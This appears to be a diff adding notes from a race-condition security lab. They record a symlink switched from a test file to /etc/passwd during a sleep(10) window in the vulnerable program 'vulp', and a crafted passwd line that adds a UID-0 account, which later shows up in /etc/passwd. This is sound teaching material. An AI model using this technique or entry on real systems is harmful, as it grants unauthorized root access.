@@ -1,0 +1,18 @@
+Task 2.A: slow-machine race using sleep(10)
+MAGIC input used by vulp:
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+
+BEFORE running vulp:
+lrwxrwxrwx 1 seed seed 28 Jun  2 01:55 /tmp/XYZ -> /home/seed/LabsetupRace/test
+
+During sleep(10): relink /tmp/XYZ to /etc/passwd
+
+AFTER running vulp:
+lrwxrwxrwx 1 seed seed 11 Jun  2 01:55 /tmp/XYZ -> /etc/passwd
+
+End of /etc/passwd after attack:
+telnetd:x:126:134::/nonexistent:/usr/sbin/nologin
+ftp:x:127:135:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
+
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
